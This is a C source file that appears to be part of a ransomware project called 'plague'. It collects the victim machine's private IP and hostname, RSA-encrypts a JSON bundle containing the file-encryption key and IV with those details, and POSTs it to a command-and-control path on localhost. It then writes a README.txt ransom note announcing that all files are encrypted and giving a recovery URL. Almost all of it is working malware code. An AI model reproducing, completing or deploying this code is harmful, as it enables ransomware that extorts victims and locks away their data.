#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netdb.h>

#include "includes/plague.h"

void error(const char *msg)
{
    perror(msg);
    exit(0);
}

struct ifaddrs * ifAddrStruct=NULL;
struct ifaddrs * ifa=NULL;
void * tmpAddrPtr=NULL;

char *get_privateIP()
{
    char *priv_ip;

    getifaddrs(&ifAddrStruct);
    for (ifa = ifAddrStruct; ifa != NULL; ifa = ifa->ifa_next) {
        if (!ifa->ifa_addr) {
            continue;
        }
        if (ifa->ifa_addr->sa_family == AF_INET)
        {   // check it is IP4
            // is a valid IP4 Address
            tmpAddrPtr=&((struct sockaddr_in *)ifa->ifa_addr)->sin_addr;
            char addressBuffer[INET_ADDRSTRLEN];
            inet_ntop(AF_INET, tmpAddrPtr, addressBuffer, INET_ADDRSTRLEN);
            //printf("%s IP Address %s\n", ifa->ifa_name, addressBuffer);
            priv_ip = addressBuffer;
        }
    }
    if (ifAddrStruct!=NULL)
        freeifaddrs(ifAddrStruct);
    return strdup(priv_ip);
}

char *get_hostname()
{
    char hostname[1024];

    hostname[1023] = '\0';
    gethostname(hostname, 1023);
    return strdup(hostname);
}

void write_readme(char *id)
{
    FILE *fp;
    fp = fopen("README.txt","w+");
    fprintf(fp, "All your files are encrypted. Go to http://localhost/plague_server/?id=%s to know how to get your data recovered\n", id);
    fclose(fp);
}


char *send_request(char *message)
{
    struct hostent *server;
    struct sockaddr_in serv_addr;
    int sockfd, bytes, sent, received, total;
    int port = 80;
    char *host = "localhost";
    char *response;

    if (!(response = malloc(sizeof(char) * RESPONSE_SIZE)))
        exit(0);

    /* create the socket */
    sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if (sockfd < 0)
        error("ERROR opening socket");

    /* lookup the ip address */
    server = gethostbyname(host);
    if (server == NULL)
        error("ERROR, no such host");

    /* fill in the structure */
    memset(&serv_addr, 0, sizeof(serv_addr));
    serv_addr.sin_family = AF_INET;
    serv_addr.sin_port = htons(port);
    memcpy(&serv_addr.sin_addr.s_addr,server->h_addr, server->h_length);

    /* connect the socket */
    if (connect(sockfd, (struct sockaddr *)&serv_addr, sizeof(serv_addr)) < 0)
        error("ERROR connecting");

    /* send the request */
    total = (int)strlen(message);
    sent = 0;
    do {
        bytes = write(sockfd, message + sent, total - sent);
        if (bytes < 0)
            error("ERROR writing message to socket");
        if (bytes == 0)
            break;
        sent += bytes;
    } while (sent < total);

    /* receive the response */
    memset(response, 0, RESPONSE_SIZE);
    total = sizeof(char) * RESPONSE_SIZE;
    received = 0;
    do {
        bytes = read(sockfd, response + received, total - received);
        if (bytes < 0)
            error("ERROR reading response from socket");
        if (bytes == 0)
            break;
        received += bytes;
    } while (received < total);
    if (received == total)
        error("ERROR storing complete response from socket");

    /* close the socket */
    close(sockfd);
    return response;
}

int send_key(char *key, char *iv, char *hostname)
{
    char json[1024], message[4096];
    char *response;
    size_t len = 0;
    unsigned char *data;
    char *request = "POST /plague_server/ HTTP/1.1\r\n"
                    "Host: localhost\r\n"
                    "Content-Type:  application/x-www-form-urlencoded\r\n"
                    "Content-Length: %d\r\n\r\n"
                    "data=%s";
    char *format = "{\"key\":\"%s\",\"iv\":\"%s\",\"PrivateIP\":\"%s\",\"hostname\":\"%s\"}";
    char *encoded;
    int ret = 0;

    /* fill in the parameters */
    sprintf(json, format, key, iv, get_privateIP(), hostname);

    // encode data
    data = rsa_encode((unsigned char *)json, &len); //encode
    // encoded = base64_encode(data, len, &len);
    encoded = bin2hex(data, len);
    // printf("b64 data    : %s\n", encoded);
    sprintf(message, request, strlen("data=") + strlen((char *)encoded), encoded);

    response = send_request(message);

    /* process response */
    char *id = strstr(response, "id:");
    char *check = strstr(response, "check:");
    if (!id)
        return 0;
    id = strtok(id, " \n");
    if (check)
        check = strtok(check, " \n");
    if (strstr(check, "TRUE") != NULL)
        ret = 1;
    write_readme(&id[3]);
    if (response)
        free(response);
    return ret;
}
